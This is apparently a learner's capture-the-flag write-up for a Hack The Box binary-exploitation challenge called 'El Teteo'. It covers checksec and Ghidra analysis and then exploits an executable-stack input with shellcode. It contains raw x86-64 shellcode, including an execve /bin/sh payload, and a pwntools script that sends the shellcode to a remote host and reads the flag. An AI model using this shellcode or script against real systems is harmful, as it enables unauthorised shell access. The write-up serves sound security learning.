# Introduction


# Enumeration

1. Running `file`:

![](assets/El%20Teteo.png)

64-bit binary, dynamically linked.


2. using `checksec`:

![](assets/El%20Teteo-1.png)

Two main things pop out.
-  `NX unkown - GNU_STACK missing`
NX bit marks certain areas of the program as non-executable. Since the usual marker is missing, `checksec` couldn't determine from that alone if stack is executable or not, but through further analysis that:
-  Stack is executable.
This means that if we were able to inject code into the stack, we will be able to execute it.

3. Running `Ghidra`:

Got the following main function:

```python

undefined8 main(void)

{
  undefined *puVar1;
  undefined *puVar2;
  undefined *puVar3;
< -- SNIP -- > # a bunch of the same
  undefined *puVar30;
  undefined *puVar31;
  int iVar32;
  time_t tVar33;
  long in_FS_OFFSET;
  undefined *local_a8 [4];
  undefined *local_88;
  undefined *local_80;
  undefined *local_78;
  undefined8 local_68;
  undefined8 local_60;
  undefined8 local_58;
  undefined8 local_50;
  long local_40;
  
  local_40 = *(long *)(in_FS_OFFSET + 0x28);
  cls();
  local_a8[0] = &DAT_00102016;
  local_a8[1] = &DAT_0010201e;
  local_a8[2] = &DAT_00102026;
  local_a8[3] = &DAT_0010202e;
  local_88 = &DAT_00102036;
  local_80 = &DAT_0010203e;
  local_78 = &DAT_00102046;
  tVar33 = time((time_t *)0x0);
  srand((uint)tVar33);
  iVar32 = rand();
  printf("%s",local_a8[iVar32 % 6]);
  iVar32 = rand();
  puVar1 = local_a8[iVar32 % 6];
  iVar32 = rand();
  puVar2 = local_a8[iVar32 % 6];
  iVar32 = rand();
< -- SNIP -- > # a bunch of the same
  puVar31 = local_a8[iVar32 % 6];
  iVar32 = rand();
  printf(&DAT_00102058,local_a8[iVar32 % 6],puVar31,puVar30,puVar29,puVar28,puVar27,puVar26,puVar25,
         puVar24,puVar23,puVar22,puVar21,puVar20,puVar19,puVar18,puVar17,puVar16,puVar15,puVar14,
         puVar13,puVar12,puVar11,puVar10,puVar9,puVar8,puVar7,puVar6,puVar5,puVar4,puVar3,puVar2,
         puVar1);
  printstr("[!] I will do whatever you want, nice or naughty..\n\n> ");
  local_68 = 0;
  local_60 = 0;
  local_58 = 0;
  local_50 = 0;
  read(0,&local_68,0x1f);
  (*(code *)&local_68)();
  if (local_40 != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```

The code seems to include a lot of fluff, so I will run it first. After running the binary, we see the following:

![](assets/El%20Teteo-2.png)

we see that the print statement before the "I will do whatever you want" message prints an image, so we can ignore the first print statement alongside all of the fluff before it.

Next, we read into a variable called local_68 `0x1f` (31) bytes of data.
We also have an if condition that terminates if local_40's value changes.

I will need the help of a writeup to know what to do next.

The first thing that I missed is the following line:

```C
  (*(code *)&local_68)();
```

The breakdown of the line does can be found [here](https://bytebreach.com/posts/binexp-elteteo/). For simplicity, it basically runs whatever shellcode we send in the input field.

# Exploitation

We need to run shellcode that would allow us to read flag.txt. We can try to use `pwntools` for this.

Note to self, using `pwn` and `pwnlib` both at once causes issues when trying to use `shellcraft` and updating the context.

First attempt: used the following snippet of code to create the payload
```python
from pwn import *
context.update(arch='amd64', os='linux')
payload = asm(shellcraft.amd64.linux.cat('flag.txt'))
print(payload)
```

which gave us the following payload:
```
b'j\x01\xfe\x0c$H\xb8flag.txtPj\x02XH\x89\xe71\xf6\x0f\x05A\xba\xff\xff\xff\x7fH\x89\xc6j(Xj\x01_\x99\x0f\x05'
```

However, trying to input this, we get the followng:

![](assets/El%20Teteo-3.png)

This may be an architecture issue. 

trying `shellcode` failed miserably so I will use the payload suggested in the provided `solver.py` function.

The final script is as follows:

```python
#!/usr/bin/env python3

from pwn import *
def processConnection():
    try:
        host,port = sys.argv[1].split(':')
        return remote(host,port)
    except IndexError:
        print("Usage: python3 exploit.py <host:port>")
        exit(1)


#https://shell-storm.org/shellcode/files/shellcode-806.html
payload = b"\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";

connection = processConnection()
connection.sendlineafter(b'>',payload)
pause(1) # equivalent to sleep, but for the connection

connection.sendline(b'cat flag*')
flag = connection.recvline_contains('HTB').decode()
print(flag)
```

# Learning Outcomes

1. Learned about shellcode NX bit and shellcode execution.
2. Learned about shell crafting tools and databases.

# Next Steps

Learn how to use `shellcraft` effectively and how to eventually craft my own payloads.